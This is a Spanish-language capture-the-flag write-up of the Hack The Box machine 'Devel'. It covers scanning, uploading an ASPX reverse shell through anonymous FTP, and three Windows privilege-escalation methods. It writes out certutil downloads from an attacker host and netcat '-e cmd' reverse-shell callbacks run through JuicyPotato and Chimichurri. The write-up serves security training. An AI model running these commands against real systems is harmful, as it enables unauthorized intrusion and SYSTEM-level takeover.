#  DEVEL MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/1.png)

## INDEX

- [[#ESCANEO Y ENUMERACION|ESCANEO Y ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
- [[#ELEVACION DE PRIVILEGIOS|ELEVACION DE PRIVILEGIOS]]


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```
nmap -p- --open -T5 - v -n 10.10.10.5 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```
nmap -p21,80 -sV -sC 10.10.10.5 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/3.png)

## EXPLOTACION

Vemos el puerto 21 FTP con usuario anonymous habilitado es decir que si nos conectamos con el **username: anonymous** y colocamos cualquier password entrariamos:

```bash
ftp 10.10.10.5
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/4.png)

vemos que tiene ciertos archivos que talvez lo estamos viendo desde la pagina web, hay una conexion entrer el FTP y el servidor web, veamos la pagina web:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/5.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/5.png)

nos indica la version de IIS que usa (7.5), si vemos en el FTP se encuentra la imagen de la pagina por lo que podemos intuir que si podemos cargar archivos podemos verlos desde la pagina web.

probemos si podemos subir un archivo, creamos uno de prueba y nos conectamos como anonymous en la misma ruta del archivo y haces un **PUT** desde el ftp:

```bash
echo "hola mundo" > test.txt
```

```bash
put test.txt
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/7.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/8.png)

vemos que si podemos cargar archivos. IIS usa archivos de extension asp y aspx, vamos a probar con aspx por la version.

encontre este exploit en github: [https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) solo debemos cambiar la IP y el puerto al que estaremos a la escucha:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/9.png)

una vez modificado el exploit lo cargamos por FTP, nos colocamos a la escucha y lo apuntamos desde la pagina web:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/10.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/11.png)

vemos que ingresamos pero no podemos acceder a la carpeta de los usuarios:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/12.png)

tocara elevar privilegios para ver las flags.

## ELEVACION DE PRIVILEGIOS

Hay tres formas de elevar privilegios:

**METODO 1**

si vemos los privilegios del usuario:

```bash
whoami /priv
```

tiene el SEimpersonate habilitado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/13.png)

Podemos usar el juicypotato, primero descargamos el binario: [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)

por si da error aca el de 32 bits: [https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)

y descargamos el binario de netcat: [https://github.com/int0x33/nc.exe/pulse](https://github.com/int0x33/nc.exe/pulse)

en la maquina windows nos vamos a una ruta donde podamos escribir:

```bash
cd c:\Users\Public\Documents
```

nos montamos un servidor en python donde se encuentra el juicypotato y el netcat:

```bash
python -m SimpleHTTPServer
```

y pasamos los binarios a la maquina windows, desde windows ejecutamos:

```bash
certutil.exe -f -urlcache -split http://10.10.14.10:8000/jp86.exe jp86.exe

certutil.exe -f -urlcache -split http://10.10.14.10:8000/nc.exe nc.exe
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/14.png)

ahora ejecutamos el juicypotato de la siguiente manera:

```bash
jp86.exe -l 1337 -p c:\users\public\documents\nc.exe -a "-e cmd 10.10.14.10 4545" -c CLSID -t *
```

* -l: lo dejamos por defecto
* -p: que queremos ejecutar como SYSTEM
* -a: argumentos de lo que queremos ejecutar
* -t: lo dejamos por defecto asi
* -c: el CLSID por sistema operativo.

Para saber ante que sistema operativo estamos podemos hacer un:

```bash
systeminfo
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/15.png)

ahora sobre ese resultado buscamos el CLSID que corresponda aqui:

[https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

me funciono este: **{659cdea7-489e-11d9-a9cd-000d56965251}**

```bash
jp86.exe -l 1337 -p c:\users\public\documents\nc.exe -a "-e cmd 10.10.14.10 4545" -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -t *
```

como estamos llamado a netcat, antes de ejecutar, nos colocamos a la escucha por el 4545 y al ejecutarlo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/16.png)

elevamos privilegios, ahi las flags:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/17.png)

**METODO 2**

vamos a buscar un exploit para la version del sistema operativo ya que en el systeminfo vimos que es un windows 7 y es un poco antiguo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/15.png)

si buscamos en google vemos que es el **MS11-046**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/18.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/19.png)

vamos a buscarlo como **MS11-046**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/20.png)

vemos en el repo un binario lo pasamos a la maquina windows:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/21.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/22.png)

lo ejecutamos y miren quien somos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/23.png)

**METODO 3**

Uso de **chimichurri.exe** este es un exploit para elevar privilegios localmente y afecta a versiones Windows 2008 R1 & R2, Windows Vista y Windows 7.

cuando te topes con alguno de ellos no esta demas probarlo.

lo descargamos de aca [https://github.com/Re4son/Chimichurri](https://github.com/Re4son/Chimichurri)

lo pasamos a la maquina windows y lo ejecutamos:

```bash
chimichurri.exe ip_attacker port
```

```bash
chimichurri.exe 10.10.14.10 4545
```

nos colocamos a la escucha con netcat en ese puerto y miren quien somos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DEVEL/images/24.png)
